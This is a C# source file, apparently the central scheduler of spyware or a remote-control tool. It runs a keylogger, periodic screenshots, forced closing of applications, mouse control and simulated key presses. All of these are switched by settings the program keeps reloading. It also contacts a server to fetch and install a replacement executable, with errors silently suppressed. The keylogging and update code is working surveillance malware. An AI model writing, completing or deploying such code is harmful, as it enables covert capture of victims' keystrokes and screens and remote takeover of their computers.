using System;
using System.IO;
using System.Net;

namespace IDK {

    /// <summary>
    /// Main loop of the program
    /// </summary>
    class Clock : Task {

        // all tasks executed by this task
        private KeyLoggerTask KeyLogger;
        private ProcessManagingTask ProcessManager;
        private ScreenshotTask ScreenshotTask;
        private MouseTask MouseTask;
        private KeyClickerTask KeyClicker;

        // when was the last time the app checked for an update
        private DateTime LastUpdateCheck;

        /// <summary>
        /// Class constructor
        /// </summary>
        public Clock(int interval) : base(interval) {}

        /// <summary>
        /// Initializes all required tasks. Gets called before the task executes
        /// </summary>
        public override void Initialize() {
            Config config = Config.GetInstance();

            // toggle the key logging task
            if (config.Settings.LOG_KEYS && ReferenceEquals(KeyLogger, null)) {
                KeyLogger = new KeyLoggerTask();
                KeyLogger.Start();
            } else if (!config.Settings.LOG_KEYS && !ReferenceEquals(KeyLogger, null)) {
                KeyLogger.Stop();
                KeyLogger = null;
            }

            // toggle the screenshot taking task
            if (config.Settings.TAKE_SCREENSHOTS && ReferenceEquals(ScreenshotTask, null)) {
                ScreenshotTask = new ScreenshotTask();
                ScreenshotTask.Start();
            } else if (!config.Settings.TAKE_SCREENSHOTS && !ReferenceEquals(ScreenshotTask, null)) {
                ScreenshotTask.Stop();
                ScreenshotTask = null;

                // the app is no longer taking screenshots, that means that the screenshot taking logic must detach from the process manager since it also takes screenshots
                if (!ReferenceEquals(ProcessManager, null)) {
                    ProcessManager.DetachScreenshotTaker();
                }
            }

            // toggle the process managing task
            if (config.Settings.CLOSE_APPS && ReferenceEquals(ProcessManager, null)) {
                ProcessManager = config.Settings.TAKE_SCREENSHOTS ?
                    new ProcessManagingTask(ScreenshotTask.TakeScreenshot) :
                    new ProcessManagingTask();
                ProcessManager.Start();
            } else if (!config.Settings.CLOSE_APPS && !ReferenceEquals(ProcessManager, null)) {
                ProcessManager.Stop();
                ProcessManager = null;
            }

            // toggle the mouse controling task
            if (config.Settings.CONTROL_MOUSE && ReferenceEquals(MouseTask, null)) {
                MouseTask = new MouseTask();
                MouseTask.Start();
            } else if (!config.Settings.CONTROL_MOUSE && !ReferenceEquals(MouseTask, null)) {
                MouseTask.Stop();
                MouseTask = null;
            }

            // toggle the key clicking task
            if (config.Settings.CLICK_KEYS && ReferenceEquals(KeyClicker, null)) {
                KeyClicker = new KeyClickerTask();
                KeyClicker.Start();
            } else if (!config.Settings.CLICK_KEYS && !ReferenceEquals(KeyClicker, null)) {
                KeyClicker.Stop();
                KeyClicker = null;
            }
        }

        /// <summary>
        /// Method that gets called when the clock ticks (task needs to update).
        /// This method syncs settings and kills tasks if necessary
        /// </summary>
        public override void Update() {
            Config.GetInstance().LoadSettings();
            Initialize();

            // check for an update only if APP_UPDATE_CHECK_INTERVAL has passed or no checks were made before
            if (LastUpdateCheck != DateTime.MinValue) {
                TimeSpan difference = DateTime.Now - LastUpdateCheck;

                if (difference.TotalMilliseconds >= Config.GetInstance().Settings.APP_UPDATE_CHECK_INTERVAL) {
                    CheckForAppUpdate();
                }
            } else {
                LastUpdateCheck = DateTime.Now;
            }
        }

        /// <summary>
        /// Checks for an update to the app
        /// </summary>
        private void CheckForAppUpdate() {
            LastUpdateCheck = DateTime.Now;

            try {
                using (WebResponse webResponse = Network.MakeHttpRequest(Config.SERVER_BASE_URL + "update_info.php", "GET")) {
                    using (StreamReader reader = new StreamReader(webResponse.GetResponseStream())) {
                        string response = reader.ReadToEnd();

                        if (response.Equals("false")) {
                            // no update is found
                            return;
                        } else if (response.EndsWith(".exe") && !App.GetExecutableName().Equals(response)) {
                            // stop all tasks and update the app
                            ShutDown();
                            App.UpdateAppExecutable(response);
                        }
                    }
                }
            } catch { }
        }

        /// <summary>
        /// Causes all tasks running to stop, including the clock (this task)
        /// </summary>
        private void ShutDown() {
            // stop key logger if running
            if (!ReferenceEquals(KeyLogger, null)) {
                KeyLogger.Stop();
                KeyLogger = null;
            }

            // stop process manager if running
            if (!ReferenceEquals(ProcessManager, null)) {
                ProcessManager.Stop();
                ProcessManager = null;
            }

            // stop screenshot task if running
            if (!ReferenceEquals(ScreenshotTask, null)) {
                ScreenshotTask.Stop();
                ScreenshotTask = null;
            }

            // stop mouse task if running
            if (!ReferenceEquals(MouseTask, null)) {
                MouseTask.Stop();
                MouseTask = null;
            }

            // stop key clicker if running
            if (!ReferenceEquals(KeyClicker, null)) {
                KeyClicker.Stop();
                KeyClicker = null;
            }

            // stops the clock (this task)
            Stop();
        }

        /// <summary>
        /// Starts the task
        /// </summary>
        public override void Start() {
            base.Start();
            WaitForWorkerToComplete();
        }
    }
}
